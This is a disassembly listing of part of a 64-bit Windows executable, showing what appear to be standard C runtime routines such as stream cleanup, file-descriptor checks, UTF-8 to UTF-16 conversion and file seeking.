   14000b08a:	8b 41 14             	mov    0x14(%rcx),%eax
   14000b08d:	48 8b d9             	mov    %rcx,%rbx
   14000b090:	c1 e8 0d             	shr    $0xd,%eax
   14000b093:	a8 01                	test   $0x1,%al
   14000b095:	74 27                	je     0x14000b0be
   14000b097:	8b 41 14             	mov    0x14(%rcx),%eax
   14000b09a:	c1 e8 06             	shr    $0x6,%eax
   14000b09d:	a8 01                	test   $0x1,%al
   14000b09f:	74 1d                	je     0x14000b0be
   14000b0a1:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   14000b0a5:	e8 c6 b0 ff ff       	call   0x140006170
   14000b0aa:	f0 81 63 14 bf fe ff 	lock andl $0xfffffebf,0x14(%rbx)
   14000b0b1:	ff 
   14000b0b2:	33 c0                	xor    %eax,%eax
   14000b0b4:	48 89 43 08          	mov    %rax,0x8(%rbx)
   14000b0b8:	48 89 03             	mov    %rax,(%rbx)
   14000b0bb:	89 43 10             	mov    %eax,0x10(%rbx)
   14000b0be:	48 83 c4 20          	add    $0x20,%rsp
   14000b0c2:	5b                   	pop    %rbx
   14000b0c3:	c3                   	ret
   14000b0c4:	48 83 ec 28          	sub    $0x28,%rsp
   14000b0c8:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   14000b0cb:	75 0d                	jne    0x14000b0da
   14000b0cd:	e8 be a8 ff ff       	call   0x140005990
   14000b0d2:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000b0d8:	eb 42                	jmp    0x14000b11c
   14000b0da:	85 c9                	test   %ecx,%ecx
   14000b0dc:	78 2e                	js     0x14000b10c
   14000b0de:	3b 0d ec da 00 00    	cmp    0xdaec(%rip),%ecx        # 0x140018bd0
   14000b0e4:	73 26                	jae    0x14000b10c
   14000b0e6:	48 63 c9             	movslq %ecx,%rcx
   14000b0e9:	48 8d 15 e0 d6 00 00 	lea    0xd6e0(%rip),%rdx        # 0x1400187d0
   14000b0f0:	48 8b c1             	mov    %rcx,%rax
   14000b0f3:	83 e1 3f             	and    $0x3f,%ecx
   14000b0f6:	48 c1 f8 06          	sar    $0x6,%rax
   14000b0fa:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   14000b0fe:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   14000b102:	0f b6 44 c8 38       	movzbl 0x38(%rax,%rcx,8),%eax
   14000b107:	83 e0 40             	and    $0x40,%eax
   14000b10a:	eb 12                	jmp    0x14000b11e
   14000b10c:	e8 7f a8 ff ff       	call   0x140005990
   14000b111:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000b117:	e8 54 a7 ff ff       	call   0x140005870
   14000b11c:	33 c0                	xor    %eax,%eax
   14000b11e:	48 83 c4 28          	add    $0x28,%rsp
   14000b122:	c3                   	ret
   14000b123:	cc                   	int3
   14000b124:	40 53                	rex push %rbx
   14000b126:	48 83 ec 40          	sub    $0x40,%rsp
   14000b12a:	48 63 d9             	movslq %ecx,%rbx
   14000b12d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000b132:	e8 09 89 ff ff       	call   0x140003a40
   14000b137:	8d 43 01             	lea    0x1(%rbx),%eax
   14000b13a:	3d 00 01 00 00       	cmp    $0x100,%eax
   14000b13f:	77 13                	ja     0x14000b154
   14000b141:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   14000b146:	48 8b 08             	mov    (%rax),%rcx
   14000b149:	0f b7 04 59          	movzwl (%rcx,%rbx,2),%eax
   14000b14d:	25 00 80 00 00       	and    $0x8000,%eax
   14000b152:	eb 02                	jmp    0x14000b156
   14000b154:	33 c0                	xor    %eax,%eax
   14000b156:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   14000b15b:	74 0c                	je     0x14000b169
   14000b15d:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000b162:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   14000b169:	48 83 c4 40          	add    $0x40,%rsp
   14000b16d:	5b                   	pop    %rbx
   14000b16e:	c3                   	ret
   14000b16f:	cc                   	int3
   14000b170:	40 53                	rex push %rbx
   14000b172:	48 83 ec 30          	sub    $0x30,%rsp
   14000b176:	48 8b d9             	mov    %rcx,%rbx
   14000b179:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000b17e:	e8 81 03 00 00       	call   0x14000b504
   14000b183:	48 83 f8 04          	cmp    $0x4,%rax
   14000b187:	77 1a                	ja     0x14000b1a3
   14000b189:	8b 54 24 20          	mov    0x20(%rsp),%edx
   14000b18d:	b9 fd ff 00 00       	mov    $0xfffd,%ecx
   14000b192:	81 fa ff ff 00 00    	cmp    $0xffff,%edx
   14000b198:	0f 47 d1             	cmova  %ecx,%edx
   14000b19b:	48 85 db             	test   %rbx,%rbx
   14000b19e:	74 03                	je     0x14000b1a3
   14000b1a0:	66 89 13             	mov    %dx,(%rbx)
   14000b1a3:	48 83 c4 30          	add    $0x30,%rsp
   14000b1a7:	5b                   	pop    %rbx
   14000b1a8:	c3                   	ret
   14000b1a9:	cc                   	int3
   14000b1aa:	cc                   	int3
   14000b1ab:	cc                   	int3
   14000b1ac:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000b1b1:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000b1b6:	57                   	push   %rdi
   14000b1b7:	41 54                	push   %r12
   14000b1b9:	41 55                	push   %r13
   14000b1bb:	41 56                	push   %r14
   14000b1bd:	41 57                	push   %r15
   14000b1bf:	48 83 ec 20          	sub    $0x20,%rsp
   14000b1c3:	48 8b 3a             	mov    (%rdx),%rdi
   14000b1c6:	45 33 ed             	xor    %r13d,%r13d
   14000b1c9:	4d 8b e1             	mov    %r9,%r12
   14000b1cc:	49 8b e8             	mov    %r8,%rbp
   14000b1cf:	4c 8b f2             	mov    %rdx,%r14
   14000b1d2:	4c 8b f9             	mov    %rcx,%r15
   14000b1d5:	48 85 c9             	test   %rcx,%rcx
   14000b1d8:	0f 84 ee 00 00 00    	je     0x14000b2cc
   14000b1de:	48 8b d9             	mov    %rcx,%rbx
   14000b1e1:	4d 85 c0             	test   %r8,%r8
   14000b1e4:	0f 84 a1 00 00 00    	je     0x14000b28b
   14000b1ea:	44 38 2f             	cmp    %r13b,(%rdi)
   14000b1ed:	75 08                	jne    0x14000b1f7
   14000b1ef:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000b1f5:	eb 1d                	jmp    0x14000b214
   14000b1f7:	44 38 6f 01          	cmp    %r13b,0x1(%rdi)
   14000b1fb:	75 08                	jne    0x14000b205
   14000b1fd:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000b203:	eb 0f                	jmp    0x14000b214
   14000b205:	8a 47 02             	mov    0x2(%rdi),%al
   14000b208:	f6 d8                	neg    %al
   14000b20a:	4d 1b c0             	sbb    %r8,%r8
   14000b20d:	49 f7 d8             	neg    %r8
   14000b210:	49 83 c0 03          	add    $0x3,%r8
   14000b214:	4d 8b cc             	mov    %r12,%r9
   14000b217:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000b21c:	48 8b d7             	mov    %rdi,%rdx
   14000b21f:	e8 e0 02 00 00       	call   0x14000b504
   14000b224:	48 8b d0             	mov    %rax,%rdx
   14000b227:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b22b:	74 75                	je     0x14000b2a2
   14000b22d:	48 85 c0             	test   %rax,%rax
   14000b230:	74 67                	je     0x14000b299
   14000b232:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   14000b236:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
   14000b23c:	76 39                	jbe    0x14000b277
   14000b23e:	48 83 fd 01          	cmp    $0x1,%rbp
   14000b242:	76 47                	jbe    0x14000b28b
   14000b244:	81 c1 00 00 ff ff    	add    $0xffff0000,%ecx
   14000b24a:	41 b8 00 d8 00 00    	mov    $0xd800,%r8d
   14000b250:	8b c1                	mov    %ecx,%eax
   14000b252:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   14000b256:	c1 e8 0a             	shr    $0xa,%eax
   14000b259:	48 ff cd             	dec    %rbp
   14000b25c:	66 41 0b c0          	or     %r8w,%ax
   14000b260:	66 89 03             	mov    %ax,(%rbx)
   14000b263:	b8 ff 03 00 00       	mov    $0x3ff,%eax
   14000b268:	66 23 c8             	and    %ax,%cx
   14000b26b:	48 83 c3 02          	add    $0x2,%rbx
   14000b26f:	b8 00 dc 00 00       	mov    $0xdc00,%eax
   14000b274:	66 0b c8             	or     %ax,%cx
   14000b277:	66 89 0b             	mov    %cx,(%rbx)
   14000b27a:	48 03 fa             	add    %rdx,%rdi
   14000b27d:	48 83 c3 02          	add    $0x2,%rbx
   14000b281:	48 83 ed 01          	sub    $0x1,%rbp
   14000b285:	0f 85 5f ff ff ff    	jne    0x14000b1ea
   14000b28b:	49 2b df             	sub    %r15,%rbx
   14000b28e:	49 89 3e             	mov    %rdi,(%r14)
   14000b291:	48 d1 fb             	sar    $1,%rbx
   14000b294:	48 8b c3             	mov    %rbx,%rax
   14000b297:	eb 1b                	jmp    0x14000b2b4
   14000b299:	49 8b fd             	mov    %r13,%rdi
   14000b29c:	66 44 89 2b          	mov    %r13w,(%rbx)
   14000b2a0:	eb e9                	jmp    0x14000b28b
   14000b2a2:	49 89 3e             	mov    %rdi,(%r14)
   14000b2a5:	e8 e6 a6 ff ff       	call   0x140005990
   14000b2aa:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   14000b2b0:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000b2b4:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   14000b2b9:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   14000b2be:	48 83 c4 20          	add    $0x20,%rsp
   14000b2c2:	41 5f                	pop    %r15
   14000b2c4:	41 5e                	pop    %r14
   14000b2c6:	41 5d                	pop    %r13
   14000b2c8:	41 5c                	pop    %r12
   14000b2ca:	5f                   	pop    %rdi
   14000b2cb:	c3                   	ret
   14000b2cc:	49 8b dd             	mov    %r13,%rbx
   14000b2cf:	44 38 2f             	cmp    %r13b,(%rdi)
   14000b2d2:	75 08                	jne    0x14000b2dc
   14000b2d4:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   14000b2da:	eb 1d                	jmp    0x14000b2f9
   14000b2dc:	44 38 6f 01          	cmp    %r13b,0x1(%rdi)
   14000b2e0:	75 08                	jne    0x14000b2ea
   14000b2e2:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000b2e8:	eb 0f                	jmp    0x14000b2f9
   14000b2ea:	8a 47 02             	mov    0x2(%rdi),%al
   14000b2ed:	f6 d8                	neg    %al
   14000b2ef:	4d 1b c0             	sbb    %r8,%r8
   14000b2f2:	49 f7 d8             	neg    %r8
   14000b2f5:	49 83 c0 03          	add    $0x3,%r8
   14000b2f9:	4d 8b cc             	mov    %r12,%r9
   14000b2fc:	48 8b d7             	mov    %rdi,%rdx
   14000b2ff:	33 c9                	xor    %ecx,%ecx
   14000b301:	e8 fe 01 00 00       	call   0x14000b504
   14000b306:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b30a:	74 99                	je     0x14000b2a5
   14000b30c:	48 85 c0             	test   %rax,%rax
   14000b30f:	74 83                	je     0x14000b294
   14000b311:	48 83 f8 04          	cmp    $0x4,%rax
   14000b315:	75 03                	jne    0x14000b31a
   14000b317:	48 ff c3             	inc    %rbx
   14000b31a:	48 03 f8             	add    %rax,%rdi
   14000b31d:	48 ff c3             	inc    %rbx
   14000b320:	eb ad                	jmp    0x14000b2cf
   14000b322:	cc                   	int3
   14000b323:	cc                   	int3
   14000b324:	33 c0                	xor    %eax,%eax
   14000b326:	38 01                	cmp    %al,(%rcx)
   14000b328:	74 0e                	je     0x14000b338
   14000b32a:	48 3b c2             	cmp    %rdx,%rax
   14000b32d:	74 09                	je     0x14000b338
   14000b32f:	48 ff c0             	inc    %rax
   14000b332:	80 3c 08 00          	cmpb   $0x0,(%rax,%rcx,1)
   14000b336:	75 f2                	jne    0x14000b32a
   14000b338:	c3                   	ret
   14000b339:	cc                   	int3
   14000b33a:	cc                   	int3
   14000b33b:	cc                   	int3
   14000b33c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b341:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000b346:	57                   	push   %rdi
   14000b347:	48 83 ec 20          	sub    $0x20,%rsp
   14000b34b:	48 63 d9             	movslq %ecx,%rbx
   14000b34e:	41 8b f8             	mov    %r8d,%edi
   14000b351:	8b cb                	mov    %ebx,%ecx
   14000b353:	48 8b f2             	mov    %rdx,%rsi
   14000b356:	e8 59 ca ff ff       	call   0x140007db4
   14000b35b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b35f:	75 11                	jne    0x14000b372
   14000b361:	e8 2a a6 ff ff       	call   0x140005990
   14000b366:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000b36c:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000b370:	eb 53                	jmp    0x14000b3c5
   14000b372:	44 8b cf             	mov    %edi,%r9d
   14000b375:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   14000b37a:	48 8b d6             	mov    %rsi,%rdx
   14000b37d:	48 8b c8             	mov    %rax,%rcx
   14000b380:	ff 15 1a 1d 00 00    	call   *0x1d1a(%rip)        # 0x14000d0a0
   14000b386:	85 c0                	test   %eax,%eax
   14000b388:	75 0f                	jne    0x14000b399
   14000b38a:	ff 15 88 1c 00 00    	call   *0x1c88(%rip)        # 0x14000d018
   14000b390:	8b c8                	mov    %eax,%ecx
   14000b392:	e8 89 a5 ff ff       	call   0x140005920
   14000b397:	eb d3                	jmp    0x14000b36c
   14000b399:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000b39e:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000b3a2:	74 c8                	je     0x14000b36c
   14000b3a4:	48 8b d3             	mov    %rbx,%rdx
   14000b3a7:	4c 8d 05 22 d4 00 00 	lea    0xd422(%rip),%r8        # 0x1400187d0
   14000b3ae:	83 e2 3f             	and    $0x3f,%edx
   14000b3b1:	48 8b cb             	mov    %rbx,%rcx
   14000b3b4:	48 c1 f9 06          	sar    $0x6,%rcx
   14000b3b8:	48 8d 14 d2          	lea    (%rdx,%rdx,8),%rdx
   14000b3bc:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   14000b3c0:	80 64 d1 38 fd       	andb   $0xfd,0x38(%rcx,%rdx,8)
   14000b3c5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000b3ca:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000b3cf:	48 83 c4 20          	add    $0x20,%rsp
   14000b3d3:	5f                   	pop    %rdi
   14000b3d4:	c3                   	ret
   14000b3d5:	cc                   	int3
   14000b3d6:	cc                   	int3
   14000b3d7:	cc                   	int3
   14000b3d8:	e9 5f ff ff ff       	jmp    0x14000b33c
   14000b3dd:	cc                   	int3
   14000b3de:	cc                   	int3
   14000b3df:	cc                   	int3
   14000b3e0:	66 89 4c 24 08       	mov    %cx,0x8(%rsp)
   14000b3e5:	48 83 ec 28          	sub    $0x28,%rsp
   14000b3e9:	e8 9e 08 00 00       	call   0x14000bc8c
   14000b3ee:	85 c0                	test   %eax,%eax
   14000b3f0:	74 1f                	je     0x14000b411
   14000b3f2:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   14000b3f7:	ba 01 00 00 00       	mov    $0x1,%edx
   14000b3fc:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000b401:	e8 f6 08 00 00       	call   0x14000bcfc
   14000b406:	85 c0                	test   %eax,%eax
   14000b408:	74 07                	je     0x14000b411
   14000b40a:	0f b7 44 24 30       	movzwl 0x30(%rsp),%eax
   14000b40f:	eb 05                	jmp    0x14000b416
   14000b411:	b8 ff ff 00 00       	mov    $0xffff,%eax
   14000b416:	48 83 c4 28          	add    $0x28,%rsp
   14000b41a:	c3                   	ret
   14000b41b:	cc                   	int3
   14000b41c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000b421:	57                   	push   %rdi
   14000b422:	48 83 ec 20          	sub    $0x20,%rsp
   14000b426:	48 8b d9             	mov    %rcx,%rbx
   14000b429:	48 85 c9             	test   %rcx,%rcx
   14000b42c:	75 15                	jne    0x14000b443
   14000b42e:	e8 5d a5 ff ff       	call   0x140005990
   14000b433:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000b439:	e8 32 a4 ff ff       	call   0x140005870
   14000b43e:	83 c8 ff             	or     $0xffffffff,%eax
   14000b441:	eb 51                	jmp    0x14000b494
   14000b443:	8b 41 14             	mov    0x14(%rcx),%eax
   14000b446:	83 cf ff             	or     $0xffffffff,%edi
   14000b449:	c1 e8 0d             	shr    $0xd,%eax
   14000b44c:	a8 01                	test   $0x1,%al
   14000b44e:	74 3a                	je     0x14000b48a
   14000b450:	e8 3b db ff ff       	call   0x140008f90
   14000b455:	48 8b cb             	mov    %rbx,%rcx
   14000b458:	8b f8                	mov    %eax,%edi
   14000b45a:	e8 25 fc ff ff       	call   0x14000b084
   14000b45f:	48 8b cb             	mov    %rbx,%rcx
   14000b462:	e8 15 df ff ff       	call   0x14000937c
   14000b467:	8b c8                	mov    %eax,%ecx
   14000b469:	e8 c2 09 00 00       	call   0x14000be30
   14000b46e:	85 c0                	test   %eax,%eax
   14000b470:	79 05                	jns    0x14000b477
   14000b472:	83 cf ff             	or     $0xffffffff,%edi
   14000b475:	eb 13                	jmp    0x14000b48a
   14000b477:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000b47b:	48 85 c9             	test   %rcx,%rcx
   14000b47e:	74 0a                	je     0x14000b48a
   14000b480:	e8 eb ac ff ff       	call   0x140006170
   14000b485:	48 83 63 28 00       	andq   $0x0,0x28(%rbx)
   14000b48a:	48 8b cb             	mov    %rbx,%rcx
   14000b48d:	e8 02 0b 00 00       	call   0x14000bf94
   14000b492:	8b c7                	mov    %edi,%eax
   14000b494:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000b499:	48 83 c4 20          	add    $0x20,%rsp
   14000b49d:	5f                   	pop    %rdi
   14000b49e:	c3                   	ret
   14000b49f:	cc                   	int3
   14000b4a0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000b4a5:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000b4aa:	57                   	push   %rdi
   14000b4ab:	48 83 ec 20          	sub    $0x20,%rsp
   14000b4af:	48 8b d9             	mov    %rcx,%rbx
   14000b4b2:	48 85 c9             	test   %rcx,%rcx
   14000b4b5:	75 1e                	jne    0x14000b4d5
   14000b4b7:	e8 d4 a4 ff ff       	call   0x140005990
   14000b4bc:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000b4c2:	e8 a9 a3 ff ff       	call   0x140005870
   14000b4c7:	83 c8 ff             	or     $0xffffffff,%eax
   14000b4ca:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000b4cf:	48 83 c4 20          	add    $0x20,%rsp
   14000b4d3:	5f                   	pop    %rdi
   14000b4d4:	c3                   	ret
   14000b4d5:	8b 41 14             	mov    0x14(%rcx),%eax
   14000b4d8:	c1 e8 0c             	shr    $0xc,%eax
   14000b4db:	a8 01                	test   $0x1,%al
   14000b4dd:	74 07                	je     0x14000b4e6
   14000b4df:	e8 b0 0a 00 00       	call   0x14000bf94
   14000b4e4:	eb e1                	jmp    0x14000b4c7
   14000b4e6:	e8 f1 dc ff ff       	call   0x1400091dc
   14000b4eb:	90                   	nop
   14000b4ec:	48 8b cb             	mov    %rbx,%rcx
   14000b4ef:	e8 28 ff ff ff       	call   0x14000b41c
   14000b4f4:	8b f8                	mov    %eax,%edi
   14000b4f6:	48 8b cb             	mov    %rbx,%rcx
   14000b4f9:	e8 ea dc ff ff       	call   0x1400091e8
   14000b4fe:	8b c7                	mov    %edi,%eax
   14000b500:	eb c8                	jmp    0x14000b4ca
   14000b502:	cc                   	int3
   14000b503:	cc                   	int3
   14000b504:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000b509:	55                   	push   %rbp
   14000b50a:	56                   	push   %rsi
   14000b50b:	57                   	push   %rdi
   14000b50c:	41 56                	push   %r14
   14000b50e:	41 57                	push   %r15
   14000b510:	48 83 ec 40          	sub    $0x40,%rsp
   14000b514:	48 8b 05 e5 ba 00 00 	mov    0xbae5(%rip),%rax        # 0x140017000
   14000b51b:	48 33 c4             	xor    %rsp,%rax
   14000b51e:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000b523:	45 33 d2             	xor    %r10d,%r10d
   14000b526:	4c 8d 1d 03 d7 00 00 	lea    0xd703(%rip),%r11        # 0x140018c30
   14000b52d:	4d 85 c9             	test   %r9,%r9
   14000b530:	48 8d 3d db 26 00 00 	lea    0x26db(%rip),%rdi        # 0x14000dc12
   14000b537:	48 8b c2             	mov    %rdx,%rax
   14000b53a:	4c 8b fa             	mov    %rdx,%r15
   14000b53d:	4d 0f 45 d9          	cmovne %r9,%r11
   14000b541:	48 85 d2             	test   %rdx,%rdx
   14000b544:	41 8d 6a 01          	lea    0x1(%r10),%ebp
   14000b548:	48 0f 45 fa          	cmovne %rdx,%rdi
   14000b54c:	44 8b f5             	mov    %ebp,%r14d
   14000b54f:	4d 0f 45 f0          	cmovne %r8,%r14
   14000b553:	48 f7 d8             	neg    %rax
   14000b556:	48 1b f6             	sbb    %rsi,%rsi
   14000b559:	48 23 f1             	and    %rcx,%rsi
   14000b55c:	4d 85 f6             	test   %r14,%r14
   14000b55f:	75 0c                	jne    0x14000b56d
   14000b561:	48 c7 c0 fe ff ff ff 	mov    $0xfffffffffffffffe,%rax
   14000b568:	e9 4e 01 00 00       	jmp    0x14000b6bb
   14000b56d:	66 45 39 53 06       	cmp    %r10w,0x6(%r11)
   14000b572:	75 68                	jne    0x14000b5dc
   14000b574:	44 0f b6 0f          	movzbl (%rdi),%r9d
   14000b578:	48 ff c7             	inc    %rdi
   14000b57b:	45 84 c9             	test   %r9b,%r9b
   14000b57e:	78 17                	js     0x14000b597
   14000b580:	48 85 f6             	test   %rsi,%rsi
   14000b583:	74 03                	je     0x14000b588
   14000b585:	44 89 0e             	mov    %r9d,(%rsi)
   14000b588:	45 84 c9             	test   %r9b,%r9b
   14000b58b:	41 0f 95 c2          	setne  %r10b
   14000b58f:	49 8b c2             	mov    %r10,%rax
   14000b592:	e9 24 01 00 00       	jmp    0x14000b6bb
   14000b597:	41 8a c1             	mov    %r9b,%al
   14000b59a:	24 e0                	and    $0xe0,%al
   14000b59c:	3c c0                	cmp    $0xc0,%al
   14000b59e:	75 05                	jne    0x14000b5a5
   14000b5a0:	41 b0 02             	mov    $0x2,%r8b
   14000b5a3:	eb 1e                	jmp    0x14000b5c3
   14000b5a5:	41 8a c1             	mov    %r9b,%al
   14000b5a8:	24 f0                	and    $0xf0,%al
   14000b5aa:	3c e0                	cmp    $0xe0,%al
   14000b5ac:	75 05                	jne    0x14000b5b3
   14000b5ae:	41 b0 03             	mov    $0x3,%r8b
   14000b5b1:	eb 10                	jmp    0x14000b5c3
   14000b5b3:	41 8a c1             	mov    %r9b,%al
   14000b5b6:	24 f8                	and    $0xf8,%al
   14000b5b8:	3c f0                	cmp    $0xf0,%al
   14000b5ba:	0f 85 e9 00 00 00    	jne    0x14000b6a9
   14000b5c0:	41 b0 04             	mov    $0x4,%r8b
   14000b5c3:	41 0f b6 c0          	movzbl %r8b,%eax
   14000b5c7:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000b5cc:	2b c8                	sub    %eax,%ecx
   14000b5ce:	8b d5                	mov    %ebp,%edx
   14000b5d0:	d3 e2                	shl    %cl,%edx
   14000b5d2:	41 8a d8             	mov    %r8b,%bl
   14000b5d5:	2b d5                	sub    %ebp,%edx
   14000b5d7:	41 23 d1             	and    %r9d,%edx
   14000b5da:	eb 29                	jmp    0x14000b605
   14000b5dc:	45 8a 43 04          	mov    0x4(%r11),%r8b
   14000b5e0:	41 8b 13             	mov    (%r11),%edx
   14000b5e3:	41 8a 5b 06          	mov    0x6(%r11),%bl
   14000b5e7:	41 8d 40 fe          	lea    -0x2(%r8),%eax
   14000b5eb:	3c 02                	cmp    $0x2,%al
   14000b5ed:	0f 87 b6 00 00 00    	ja     0x14000b6a9
   14000b5f3:	40 3a dd             	cmp    %bpl,%bl
   14000b5f6:	0f 82 ad 00 00 00    	jb     0x14000b6a9
   14000b5fc:	41 3a d8             	cmp    %r8b,%bl
   14000b5ff:	0f 83 a4 00 00 00    	jae    0x14000b6a9
   14000b605:	0f b6 eb             	movzbl %bl,%ebp
   14000b608:	49 3b ee             	cmp    %r14,%rbp
   14000b60b:	44 8b cd             	mov    %ebp,%r9d
   14000b60e:	4d 0f 43 ce          	cmovae %r14,%r9
   14000b612:	eb 1e                	jmp    0x14000b632
   14000b614:	0f b6 0f             	movzbl (%rdi),%ecx
   14000b617:	48 ff c7             	inc    %rdi
   14000b61a:	8a c1                	mov    %cl,%al
   14000b61c:	24 c0                	and    $0xc0,%al
   14000b61e:	3c 80                	cmp    $0x80,%al
   14000b620:	0f 85 83 00 00 00    	jne    0x14000b6a9
   14000b626:	8b c2                	mov    %edx,%eax
   14000b628:	83 e1 3f             	and    $0x3f,%ecx
   14000b62b:	c1 e0 06             	shl    $0x6,%eax
   14000b62e:	8b d1                	mov    %ecx,%edx
   14000b630:	0b d0                	or     %eax,%edx
   14000b632:	48 8b c7             	mov    %rdi,%rax
   14000b635:	49 2b c7             	sub    %r15,%rax
   14000b638:	49 3b c1             	cmp    %r9,%rax
   14000b63b:	72 d7                	jb     0x14000b614
   14000b63d:	4c 3b cd             	cmp    %rbp,%r9
   14000b640:	73 1c                	jae    0x14000b65e
   14000b642:	41 0f b6 c0          	movzbl %r8b,%eax
   14000b646:	41 2a d9             	sub    %r9b,%bl
   14000b649:	66 41 89 43 04       	mov    %ax,0x4(%r11)
   14000b64e:	0f b6 c3             	movzbl %bl,%eax
   14000b651:	66 41 89 43 06       	mov    %ax,0x6(%r11)
   14000b656:	41 89 13             	mov    %edx,(%r11)
   14000b659:	e9 03 ff ff ff       	jmp    0x14000b561
   14000b65e:	8d 82 00 28 ff ff    	lea    -0xd800(%rdx),%eax
   14000b664:	3d ff 07 00 00       	cmp    $0x7ff,%eax
   14000b669:	76 3e                	jbe    0x14000b6a9
   14000b66b:	81 fa 00 00 11 00    	cmp    $0x110000,%edx
   14000b671:	73 36                	jae    0x14000b6a9
   14000b673:	41 0f b6 c0          	movzbl %r8b,%eax
   14000b677:	c7 44 24 20 80 00 00 	movl   $0x80,0x20(%rsp)
   14000b67e:	00 
   14000b67f:	c7 44 24 24 00 08 00 	movl   $0x800,0x24(%rsp)
   14000b686:	00 
   14000b687:	c7 44 24 28 00 00 01 	movl   $0x10000,0x28(%rsp)
   14000b68e:	00 
   14000b68f:	3b 54 84 18          	cmp    0x18(%rsp,%rax,4),%edx
   14000b693:	72 14                	jb     0x14000b6a9
   14000b695:	48 85 f6             	test   %rsi,%rsi
   14000b698:	74 02                	je     0x14000b69c
   14000b69a:	89 16                	mov    %edx,(%rsi)
   14000b69c:	f7 da                	neg    %edx
   14000b69e:	4d 89 13             	mov    %r10,(%r11)
   14000b6a1:	48 1b c0             	sbb    %rax,%rax
   14000b6a4:	48 23 c5             	and    %rbp,%rax
   14000b6a7:	eb 12                	jmp    0x14000b6bb
   14000b6a9:	4d 89 13             	mov    %r10,(%r11)
   14000b6ac:	e8 df a2 ff ff       	call   0x140005990
   14000b6b1:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   14000b6b7:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000b6bb:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000b6c0:	48 33 cc             	xor    %rsp,%rcx
   14000b6c3:	e8 b8 5e ff ff       	call   0x140001580
   14000b6c8:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   14000b6cd:	48 83 c4 40          	add    $0x40,%rsp
   14000b6d1:	41 5f                	pop    %r15
   14000b6d3:	41 5e                	pop    %r14
   14000b6d5:	5f                   	pop    %rdi
   14000b6d6:	5e                   	pop    %rsi
   14000b6d7:	5d                   	pop    %rbp
   14000b6d8:	c3                   	ret
   14000b6d9:	cc                   	int3
   14000b6da:	cc                   	int3
   14000b6db:	cc                   	int3
   14000b6dc:	cc                   	int3
   14000b6dd:	cc                   	int3
   14000b6de:	cc                   	int3
   14000b6df:	cc                   	int3
   14000b6e0:	48 83 ec 58          	sub    $0x58,%rsp
   14000b6e4:	66 0f 7f 74 24 20    	movdqa %xmm6,0x20(%rsp)
   14000b6ea:	83 3d 4b d5 00 00 00 	cmpl   $0x0,0xd54b(%rip)        # 0x140018c3c
   14000b6f1:	0f 85 e9 02 00 00    	jne    0x14000b9e0
   14000b6f7:	66 0f 28 d8          	movapd %xmm0,%xmm3
   14000b6fb:	66 0f 28 e0          	movapd %xmm0,%xmm4
   14000b6ff:	66 0f 73 d3 34       	psrlq  $0x34,%xmm3
   14000b704:	66 48 0f 7e c0       	movq   %xmm0,%rax
   14000b709:	66 0f fb 1d 6f 75 00 	psubq  0x756f(%rip),%xmm3        # 0x140012c80
   14000b710:	00 
   14000b711:	66 0f 28 e8          	movapd %xmm0,%xmm5
   14000b715:	66 0f 54 2d 33 75 00 	andpd  0x7533(%rip),%xmm5        # 0x140012c50
   14000b71c:	00 
   14000b71d:	66 0f 2f 2d 2b 75 00 	comisd 0x752b(%rip),%xmm5        # 0x140012c50
   14000b724:	00 
